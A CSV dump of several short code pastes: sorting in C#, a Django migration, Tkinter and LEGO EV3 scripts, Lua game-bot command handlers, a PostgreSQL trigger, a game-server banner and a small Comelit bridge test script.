id,title,username,language,date,content
uwr7YnYg,Курсова работа код - КА,GerogiGeorgiev-2024,C#,Monday 20th of October 2025 12:57:08 PM CDT,"using System;
using System.Diagnostics;

class Program
{
    static void Main()
    {
        const int SIZE = 50; // броят елементи в масива

        int[] numbers = new int[SIZE];
        Random rand = new Random();

        // Попълваме масива с произволни числа
        for (int i = 0; i < SIZE; i++)
            numbers[i] = rand.Next(0, 1000);

        Console.WriteLine(""Масив преди сортиране:"");
        Console.WriteLine(string.Join("" "", numbers));

        // Измерваме времето за сортиране
        Stopwatch sw = new Stopwatch();
        sw.Start();

        BubbleSort(numbers);

        sw.Stop();

        Console.WriteLine(""\nМасив след сортиране:"");
        Console.WriteLine(string.Join("" "", numbers));

        Console.WriteLine($""\nВреме за изпълнение: {sw.Elapsed.TotalMilliseconds:F3} ms"");
    }

    static void BubbleSort(int[] arr)
    {
        int n = arr.Length;
        for (int i = 0; i < n - 1; i++)
        {
            bool swapped = false;
            for (int j = 0; j < n - i - 1; j++)
            {
                if (arr[j] > arr[j + 1])
                {
                    int temp = arr[j];
                    arr[j] = arr[j + 1];
                    arr[j + 1] = temp;
                    swapped = true;
                }
            }
            if (!swapped)
                break;
        }
    }
}
"
aDjcjxcc,my_paste,str8zer0,Python,Monday 20th of October 2025 12:56:13 PM CDT,"def set_rarity(apps, schema_editor):
    ITEM_RARITIES = {
        ""Rare"": lambda r: r <= 10,
        ""Very Rare"": lambda r: 11 <= r <= 20,
        ""Extremely Rare"": lambda r: 21 <= r <= 30,
        ""Mega Rare"": lambda r: r > 30,
    }

    Item = apps.get_model(""main_app"", ""Item"")
    items = Item.objects.all()

    for item in items:
        for rarity, condition in ITEM_RARITIES.items():
            if condition(item.price):
                item.rarity = rarity
                break

    Item.objects.bulk_update(items, [""rarity""])"
h00DG83P,Tkinter - Cuadrícula de Botones,LCD-PROG,Python,Monday 20th of October 2025 12:41:36 PM CDT,"import tkinter as tk  

main_window = tk.Tk()
main_window.geometry(""520x580"")

def on_click(key: str):    
    print(f""Click on: {key}"")
    
for i in range(4):
    main_window.grid_rowconfigure(i, weight=1, uniform=""rows"")  
    main_window.grid_columnconfigure(i, weight=1, uniform=""cols"")

columna_letras:list[str] = ['A', 'B', 'C', 'D']
tarjetas:dict[str, tk.Button] = {}
 
for fila in range(4):    
    for columna in range(1, 4+1):
        clave = f""{columna_letras[fila]}{columna}"" 
        boton = tk.Button(main_window, text=clave, command=lambda k=clave:on_click(k))
        boton.grid(row=fila, column=columna-1, sticky=""nsew"", padx=6, pady=6)
        tarjetas[clave] = boton

main_window.mainloop()"
zFKvaSGs,command,BrainFart17,Lua,Monday 20th of October 2025 11:24:53 AM CDT,"Companion = require(""Companion"")
thready = require(""thready"")
local name_file = fs.open(""name.txt"", ""r"")
local name = name_file.readAll()
ccstr = require(""cc.strings"")
companion = Companion:new(name)
lastcmd = {}


function copy(orig)
    if type(orig) ~= 'table' then
        return orig
    end
    local copy_table = {}
    for k, v in pairs(orig) do
        copy_table[k] = copy(v)
    end
    return copy_table
end

cmd_array = { guard=next_guard,
    			    move = next_move,
    			    follow = next_follow,
    				spelunk = next_spelunk,
    				equip = next_equip,
    				unequip = next_unequip,
    				resume = resume_func,
    				stop = stop_func,
    				focus = focus_func,
    				unfocus = unfocus_func,
    				refuel = next_refuel,
    				stayclose = stay_close_func,
    				attack = attack_func,
    				stand_down = stand_down_func,
    				clear_hostiles = clear_hostiles_func,
    				transfer_command = next_transfer_command
}

fnc_array ={guard=nil,
			move = nil,
    		follow = nil,
    		spelunk = nil,
    		equip = nil,
    		unequip = nil,
    		resume = nil,
    		stop = nil,
    		focus = nil,
    		unfocus = nil,
    		refuel = nil,
    		stayclose = nil,
    		attack = nil,
    		stand_down = nil,
    		clear_hostiles = nil, 
    		transfer_command = nil
}
                
function command_loop(cmd)
	while true do
    	_, message, sender, uuid = os.pullEvent(""onChatMessage"")
        android.sendChatMessage(""message recieved"")
		if companion.player == nil then
            companion.player = {name=companion.playername}
        	android.sendChatMessage(""No commander initialized. Please use the transfer_command command"")
        end
        android.sendChatMessage(companion.player[""name""] .. "": "" ..tostring(companion.focused))
		if sender ~= companion.player[""name""] or not companion.focused then
            android.sendChatMessage(""message not applicable"")
        	goto continue
        end
        
        local parsed_cmd
		if cmd ~= nil then
   			parsed_cmd = copy(cmd)
		else
   			parsed_cmd = ccstr.split(message, ""%s+"")
		end
 
        local seed_str = parsed_cmd[1]
        local seed_cmd = nil
        if seed_str then
        	seed_cmd = cmd_array[seed_str]
        end
        if seed_cmd then
            if seed_str ~= ""stop"" then
               android.sendChatMessage(""Changing commands..."")
               stop_func()
               thready.spawn(""cmd"", run_command, seed_cmd, seed_str, parsed_cmd)
               android.sendChatMessage(""Engaging new command."")
           	else
               android.sendChatMessage(""Stopping current objective..."")
               stop_func()        
               android.sendChatMessage(""Ready for next command."")
            end
        else
        	goto continue
        end
		
        last_cmd = copy(parsed_cmd)
		::continue::
	end
end

function run_command(seed_cmd, seed_str, parsed_cmd)
	if fnc_array[seed_str] ~= nil then
       seed_cmd(unpack(fnc_array[seed_str](parsed_cmd)))
    else
       seed_cmd(parsed_cmd)
    end
end

function next_guard(list)
	if #list == 4 then
    	companion:guard_location({posX=tonumber(list[2]), posY = tonumber(list[3]), posZ=tonumber(list[4])})
    else
        companion:guard_entity(list[2])
    end
end
    
function next_transfer_command()
    companion:transfer_command(list[2])    
end

function next_move(list)
   android.moveTo(tonumber(list[2]), tonumber(list[3]), tonumber(list[4]))
end

function next_follow(list)
   companion:follow(list[2])
end

function next_spelunk(list)
	companion:spelunk(list[2])
end

function next_refuel(list)
    companion:refuel(list[2])
end

function next_equip(list)
	companion:equip_from_stash(list[2], list[3])
end 
function next_unequip(list)
    companion:stash_in_any()
end
function resume_func(list)
    if lastcmd[1] ~= ""resume"" then
    	command_loop(lastcmd)
    else
        android.sendChatMessage(""You cannot use resume twice in a row"")
	end
end

function stop_func(list)
   android.cancelTask()
   companion.stop = true
   while True do
       local running = companion.running_func
       sleep(.005)
       local still_running = companion.running_func
       sleep(.2)
       if not running and not still_running then
       	   break
       end
    end
    companion.stop = false
end 

function focus_func(list)
    if list[1] == companion.name then
       companion.focused = true 
    end
end

function unfocus_func(list)
	if list[1] == companion.name then
       companion.focused = false
    end
end

function stay_close_func(list)
    companion.stayclose = list[2] == ""true""
end

function attack_func(list)
    companion.hostiles[list[2]] = true
end

function stand_down_func(list)
    companion.hostiles[list[2]] = nil
end

function clear_hostiles_func(list)
    companion.hostiles = {}
end


"
zdpksUu8,Cat,ACheats,Lua,Monday 20th of October 2025 10:27:22 AM CDT,"-- cats.lua
-- Скрипт: меню категорий команд (включая 255 команд)
-- Использование:
--   !!cat                -> список категорий
--   !!cat <номер>        -> все команды в категории
--   !!cat <имя_команды>  -> показать категории, где есть команда

local args = _ARGS or {}

-- Категории и команды (включены все 255 команд)
local CATEGORIES = {
  { name = ""Утилиты / полезные"", cmds = {
    ""ohw"", ""siohw"", ""hcraes"", ""652ahs"", ""1ahs"", ""2ahs"", ""652ahs"", ""1ahs"", ""2ahs"",
    ""esrom"", ""negesrom"", ""tpyrc"", ""iruedoced"", ""iruedocne"", ""esrever"", ""esreverym"",
    ""snart"", ""emit"", ""remit"", ""nwodtnuoc"", ""trec"", ""strec"", ""siohw"", ""elbatteg"",
    ""batteg"", ""elifteg"", ""eton"", ""egarotstset"", ""tdlstset"", ""ehcac"", ""bstset"",
    ""kcats"", ""elbatesrap"", ""tsihkcatslaunam"", ""scnuf"", ""snoitcnuf"", ""bif"",
    ""nogylop"", ""652ahs"", ""1ahs"", ""2ahs"", ""setybotijome"", ""bytestoemoji"", ""hsah"", ""tpyrc""
  }},
  { name = ""Игры и развлечения"", cmds = {
    ""ecid"", ""onisac"", ""aktelur"", ""ttt"", ""ecid"", ""yadyap"", ""nioc"", ""tnaw"", ""aktelur"",
    ""onisac"", ""ecid"", ""pxnar"", ""ttt"", ""ihcag"", ""mihcag"", ""aktelur"", ""ozzadnar"",
    ""onisac"", ""yadyap"", ""ecid""
  }},
  { name = ""Развлекательные тупняки (рофл)"", cmds = {
    ""osaym"", ""doom"", ""ikhsutsahc"", ""2ikhsutsahc"", ""timilfb"", ""derb"", ""kek"", ""ovak"",
    ""aboba"", ""aboba"", ""aboba"", ""misbitahk"", ""kopslamron"", ""ortulamron"", ""recev"",
    ""gninrom"", ""einaminv"", ""ereh"", ""heh"", ""admheh"", ""yko"", ""yko"", ""yko"", ""fsserp"",
    ""aysvals"", ""axulhs"", ""csdnar"", ""ozzadnar"", ""atsap"", ""atsap""
  }},
  { name = ""NSFW / жесть"", cmds = {
    ""iatneh"", ""iatnehlanrete"", ""ihcce"", ""kcufyag"", ""nropyageoksted"", ""gnitsif"",
    ""hcord"", ""adzip"", ""anigav"", ""ssip"", ""poop"", ""ytnap"", ""kcidkcidwen"", ""skcid"",
    ""kcid"", ""axulhs"", ""kcus"", ""srekcus"", ""hsrehs""
  }},
  { name = ""Про участников чата / рейтинги"", cmds = {
    ""kcid"", ""skcid"", ""taf"", ""sammom"", ""knab"", ""pot"", ""erocs"", ""serocs"", ""etar"",
    ""amrak"", ""omas"", ""omas"", ""avals"", ""ohw"", ""siohw"", ""sresu"", ""ataDresUllAteg"",
    ""rebmeMtahCmodnaRteg"", ""ekatevig"", ""ytnap"", ""nortap"", ""niochb"", ""knab""
  }},
  { name = ""Симуляторы"", cmds = {
    ""mistanir"", ""misgnirmi"", ""mispyf"", ""misrimem"", ""misilom"", ""misavya"", ""eem"",
    ""mistanir"", ""misnwolc"", ""tpg"", ""ynopym"", ""misilom"", ""misgnirmi"", ""mistanir""
  }},
  { name = ""Технические / кодинг"", cmds = {
    ""kcufniarb"", ""negfb"", ""ferppc"", ""notip"", ""tsur"", ""оelc"", ""oelc"", ""saigdok"",
    ""snoitcnuf"", ""scnuf"", ""kcats"", ""elbatesrap"", ""negfb"", ""kcufniarb"", ""bstset"",
    ""tpyrc"", ""hsah"", ""esrever"", ""esreverym"", ""iruedoced"", ""iruedocne""
  }},
  { name = ""Админские / системные"", cmds = {
    ""nab"", ""nabnu"", ""nocr"", ""odus"", ""raelc"", ""craelc"", ""ehcac"", ""domlabolg"", ""nimda"",
    ""ehcac"", ""elifteg"", ""elbatteg"", ""batteg"", ""elifg"", ""nocr"", ""nocr""
  }},
  { name = ""BlastHack / BH-тематика"", cmds = {
    ""thb"", ""uhb"", ""sememhb"", ""enilnohb"", ""pudnatshb"", ""niochb""
  }},
  { name = ""Музыка и мультимедиа"", cmds = {
    ""cisum"", ""rugmi"", ""cstnrp"", ""emem"", ""emina"", ""rugmi"", ""csdnar"", ""cstnrp"", ""cisum"",
    ""yxo"", ""nacuot""
  }},
  { name = ""Прочее"", cmds = {
    ""ecivda"", ""kcah"", ""cam"", ""lliks"", ""onehcartop"", ""yrt"", ""syrt"", ""yrt"", ""rehtie"",
    ""aisergo"", ""pmaysav"", ""yssnnh"", ""epavdam"", ""hsarcir"", ""pir"", ""ofni"", ""aedi"",
    ""hsarc"", ""molpid"", ""enod"", ""krow"", ""nehwerehwtahw"", ""ekoj"", ""kena"", ""ameop"",
    ""ohw"", ""yhwyhw"", ""ayuhan"", ""tsetopit"", ""tiuq"", ""tiuq"", ""trec"", ""strec""
  }}
}



-- Индекс команд -> категории
local CMD_TO_CATS = {}

for i, cat in ipairs(CATEGORIES) do
  for _, cmd in ipairs(cat.cmds) do
    local key = """"
    for j = 1, #cmd do
      local c = string.byte(cmd, j)
      if c >= 65 and c <= 90 then c = c + 32 end
      key = key .. string.char(c)
    end
    CMD_TO_CATS[key] = CMD_TO_CATS[key] or {}
    table.insert(CMD_TO_CATS[key], i)
  end
end


function reverse_str(s)
    local t = {}
    for i = #s, 1, -1 do
        t[#t + 1] = string.sub(s, i, i)
    end
    return table.concat(t)
end


-- Перевод строки в нижний регистр
function lower_str(s)
  local res = """"
  for i = 1, #s do
    local c = string.byte(s, i)
    if c >= 65 and c <= 90 then c = c + 32 end
    res = res .. string.char(c)
  end
  return res
end

-- Проверка наличия подстроки
function contains(haystack, needle)
  for i = 1, #haystack - #needle + 1 do
    local match = true
    for j = 1, #needle do
      if string.byte(haystack, i + j - 1) ~= string.byte(needle, j) then
        match = false
        break
      end
    end
    if match then return true end
  end
  return false
end

-- Показать все категории
function show_categories()
  local lines = {}
  table.insert(lines, ""Категории команд:"")
  for i, cat in ipairs(CATEGORIES) do
    table.insert(lines, string.format(""%d. %s (%d)"", i, cat.name, #cat.cmds))
  end
  table.insert(lines, """")
  table.insert(lines, ""Использование:"")
  table.insert(lines, ""!!cat <номер>  — показать команды категории"")
  table.insert(lines, ""!!cat <имя>    — найти команду по имени и показать категории"")
  return table.concat(lines, ""\n"")
end

-- Показать команды категории
function show_category(idx)
  idx = tonumber(idx)
  if not idx or idx < 1 or idx > #CATEGORIES then
    return ""Неверный номер категории. Введите !!cat чтобы увидеть список.""
  end
  local cat = CATEGORIES[idx]
  local lines = {}
  table.insert(lines, string.format(""%d. %s — команды (%d):"", idx, cat.name, #cat.cmds))
  for _, cmd in ipairs(cat.cmds) do
    table.insert(lines, ""!!"" .. reverse_str(cmd))
  end
  return table.concat(lines, "" "")
end

-- Поиск команды
function find_command(name)
  if not name or name == """" then
    return ""Укажите имя команды для поиска, например: !!cats dice""
  end

  name = lower_str(name)
  local matches = {}

  if CMD_TO_CATS[name] then
    for _, idx in ipairs(CMD_TO_CATS[name]) do
      table.insert(matches, idx)
    end
  else
    for i, cat in ipairs(CATEGORIES) do
      for _, cmd in ipairs(cat.cmds) do
        if contains(lower_str(cmd), name) then
          table.insert(matches, i)
          break
        end
      end
    end
  end

  if #matches == 0 then
    return ""Команда не найдена.""
  end

  local seen = {}
  local lines = {}
  table.insert(lines, ""Найдено в категориях:"")
  for _, idx in ipairs(matches) do
    if not seen[idx] then
      table.insert(lines, string.format(""%d. %s"", idx, CATEGORIES[idx].name))
      seen[idx] = true
    end
  end
  table.insert(lines, """")
  table.insert(lines, ""Для подробного списка выполните: !!cat <номер_категории>"")

  return table.concat(lines, ""\n"")
end

-- Основная логика
if not args or args == """" then
  return show_categories()
end

-- Если args — число -> показать категорию
if tonumber(args) then
  return show_category(tonumber(args))
end

-- Иначе трактуем как имя команды -> найти её
return find_command(args)

"
fDHW2SUQ,Untitled,chrissharp123,PostgreSQL,Monday 20th of October 2025 10:02:46 AM CDT,"DECLARE
     new_copy_location INT;
 BEGIN
     IF (TG_OP = 'UPDATE') THEN
         IF NEW.location = OLD.location AND NEW.call_number = OLD.call_number AND NEW.circ_lib = OLD.circ_lib THEN
             RETURN NEW;
         END IF;
     END IF;
     SELECT INTO new_copy_location acpl.id FROM asset.copy_location acpl JOIN actor.org_unit_ancestors_distance((SELECT owning_lib FROM asset.call_number WHERE id = NEW.call_number)) aouad ON acpl.owning_lib = aouad.id WHERE deleted IS FALSE AND name = (SELECT name FROM asset.copy_location WHERE id = NEW.location) ORDER BY distance LIMIT 1;
     IF new_copy_location IS NULL THEN
         SELECT INTO new_copy_location acpl.id FROM asset.copy_location acpl JOIN actor.org_unit_ancestors_distance(NEW.circ_lib) aouad ON acpl.owning_lib = aouad.id WHERE deleted IS FALSE AND name = (SELECT name FROM asset.copy_location WHERE id = NEW.location) ORDER BY distance LIMIT 1;
     END IF;
     IF new_copy_location IS NOT NULL THEN
         NEW.location = new_copy_location;
     END IF;
     RETURN NEW;
 END;   "
s7n5JBA0,Heart | Подвал,iFoundation,HTML 5,Monday 20th of October 2025 09:18:40 AM CDT,"<align=""center""><size=24><b><color=#AED2F6>★</color> <color=#94C4F3>Р</color><color=#87BEF2>у</color><color=#79B7F0>с</color><color=#6CB0EE>с</color><color=#5FA9ED>к</color><color=#52A3EB>и</color><color=#459CE9>й</color> <color=#2B8EE6>S</color><color=#1E88E5>C</color><color=#2680DC>P</color><color=#2F79D3>:</color><color=#3872CA>S</color><color=#416BC1>L</color> <color=#535CAF>С</color><color=#5C55A6>е</color><color=#654E9E>р</color><color=#6E4695>в</color><color=#773F8C>е</color><color=#803883>р</color> <color=#922971>|</color> <color=#A41B5F>#</color><color=#AD1457>1 ★</color></b></size>

<size=22><b><color=#ECF8F9>У нас нет жестких правил, однако мы ожидаем от вас честную игру и позитив.<sup>[Без Правил]</sup></color></b></size>
<size=20><b><color=#ECF8F9>Задача нашего проекта - предоставление максимально комфортной и увлекательной игры в русском сообществе и открытость для игроков</color></b></size>

<line-height=90%><size=21><link=""https://discord.gg/heartru""><mark=#5454ed><color=#00000000>||</color></mark><mark=#6666ff><b><color=#00000000>|</color>     ＤＩＳＣＯＲＤ     <color=#00000000>|</color></b></mark><mark=#5454ed><color=#00000000>||</color></mark></link> <link=""https://docs.google.com/document/d/1jZLOdYXo3qNnkFFw3IHlbZjtVJrAhBQBfu3meQbphQc""><mark=#ed2154><color=#00000000>||</color></mark><mark=#ff3366><b><color=#00000000>|</color>       ＲＵＬＥＳ       <color=#00000000>|</color></b></mark><mark=#ed2154><color=#00000000>||</color></mark></link></align>
<size=18><align=""center""><link=""https://discord.gg/heartru""><mark=#212121><b><color=#00000000>|</color><space=14.7em><color=#00000000>|</color></b></mark></link> <space=-0.2em> <link=""https://docs.google.com/document/d/1jZLOdYXo3qNnkFFw3IHlbZjtVJrAhBQBfu3meQbphQc""><mark=#212121><b><color=#00000000>|</color><space=13.6em><color=#00000000>|</color></b></mark></link></size>

<line-height=90%><size=21><link=""https://t.me/heartsrv""><mark=#1E88E5><color=#00000000>||</color></mark><mark=#2B8EE6><b><color=#00000000>|</color>   ＴＥＬＥＧＲＡＭ    <color=#00000000>|</color></b></mark><mark=#1E88E5><color=#00000000>||</color></mark></link> <link=""https://discord.com/users/266520754038898688/""><mark=#8754ed><color=#00000000>||</color></mark><mark=#9966ff><b><color=#00000000>|</color>        ＯＷＮＥＲ       <color=#00000000>|</color></b></mark><mark=#8754ed><color=#00000000>||</color></mark></link></size>
<size=18><link=""https://t.me/heartsrv""><mark=#212121><b><color=#00000000>|</color><space=14.9em><color=#00000000>|</color></b></mark> <link=""https://discord.com/users/266520754038898688/""><mark=#212121><b><color=#00000000>|</color><space=14.0em><color=#00000000>|</color></b></mark></link> </link></size>

<size=21><b><color=#7E1717>Присоединяйтесь к нам и наслаждайтесь увлекательной игрой в русском сообществе SCP:SL!</color></b></size>

<size=18>The server allows <color=#7E1717><b>ONLY</b></color> players from post-Soviet countries and Finland or Russian speaking players.</size></align>"
X1yEgGVf,Untitled,chemelli74,Python,Monday 20th of October 2025 09:01:37 AM CDT,"""""""Quick test.""""""
import asyncio

from aiocomelit.api import (
    ComeliteSerialBridgeApi,
)
from aiohttp import ClientSession, TCPConnector
from aiohttp.cookiejar import CookieJar


ip = ""192.168.1.252""
port = 80
pin = ""123456""
pin2 = ""123456""


async def main() -> None:

    jar = CookieJar(unsafe=True)
    connector = TCPConnector(force_close=True)
    session = ClientSession(cookie_jar=jar, connector=connector)

    bridge_api = ComeliteSerialBridgeApi(
        ip, port, pin, session
    )

    await bridge_api.login()
    vedo_logged = await bridge_api.vedo_enabled(pin2)

    x = await bridge_api.get_all_devices()
    y = None
    if vedo_logged:
        y = await bridge_api.get_all_areas_and_zones()

    combined_data = [x, y]
    print(combined_data)

if __name__ == ""__main__"":
    asyncio.run(main())
"
WCuQa01x,colors,fushi,Python,Monday 20th of October 2025 08:38:53 AM CDT,"#!/usr/bin/env pybricks-micropython
from pybricks.hubs import EV3Brick
from pybricks.ev3devices import (Motor, TouchSensor, ColorSensor,
                                 InfraredSensor, UltrasonicSensor, GyroSensor)
from pybricks.parameters import Port, Stop, Direction, Button, Color
from pybricks.tools import wait, StopWatch, DataLog
from pybricks.robotics import DriveBase
from pybricks.media.ev3dev import SoundFile, ImageFile


# This program requires LEGO EV3 MicroPython v2.0 or higher.
# Click ""Open user guide"" on the EV3 extension tab for more information.


# Create your objects here.
ev3 = EV3Brick()
left_motor = Motor(Port.C)
right_motor = Motor(Port.B)
color = DriveBase(left_motor, right_motor, wheel_diameter=57.15, axle_track=88.9)
pause=1000
# wait is in MS
# I made a function because I didn't wanna change all the waits. I am very lazy.

while True:
    ev3.light.on(Color.RED)
    wait(pause)
    ev3.light.on(Color.ORANGE)
    wait(pause)
    ev3.light.on(Color.GREEN)
    wait(pause)
    ev3.light.on(Color.YELLOW)
    wait(pause)
ev3.speaker.beep
# I was trying to do R,B,G but Blue is apparently invalid! It doesn't display any color, which is labeled as a incorrect value in the documents
# Apparently Red/Orange/Green are the only values allowed in the MINDSTORMs program, but Yellow works perfectly fine.
# Setting pause to 0 is probably an epilepsy inducer and it hurts my eyes. 0/10 would not recommend
# Having no waits inbetween will cause it to remain on the last color (its too fast)
# Indents are required. Only indented stuff below a loop will be looped. Tripped me up because C++ needs parentheses."
XbtRsid1,nested_colors,fushi,Python,Monday 20th of October 2025 08:37:37 AM CDT,"#!/usr/bin/env pybricks-micropython
from pybricks.hubs import EV3Brick
from pybricks.ev3devices import (Motor, TouchSensor, ColorSensor,
                                 InfraredSensor, UltrasonicSensor, GyroSensor)
from pybricks.parameters import Port, Stop, Direction, Button, Color
from pybricks.tools import wait, StopWatch, DataLog
from pybricks.robotics import DriveBase
from pybricks.media.ev3dev import SoundFile, ImageFile


# This program requires LEGO EV3 MicroPython v2.0 or higher.
# Click ""Open user guide"" on the EV3 extension tab for more information.

# Create your objects here.
ev3 = EV3Brick()
left_motor = Motor(Port.C)
right_motor = Motor(Port.B)
color = DriveBase(left_motor, right_motor, wheel_diameter=57.15, axle_track=88.9)

while True:
    if Button.DOWN in ev3.buttons.pressed():
        ev3.light.on(Color.RED)
    if Button.LEFT in ev3.buttons.pressed():
        ev3.light.on(Color.YELLOW)
    if Button.UP in ev3.buttons.pressed():
        ev3.light.on(Color.GREEN)
    if Button.RIGHT in ev3.buttons.pressed():
        ev3.light.on(Color.ORANGE)
    if Button.CENTER in ev3.buttons.pressed():
        break
# Allows the user to switch through four colors. Hitting center exits the loop.
# Contrary to the name no I haven't figured out how to nest it or properly exit the loop without ending the program.
# Previously, after the loop, there was a beep and wait block to try preventing a total program exit, but this didn't change anything and still completely ended the loop. I tried adding another loop, but I didn't have time to put anything in the loop to test whether or not it works."
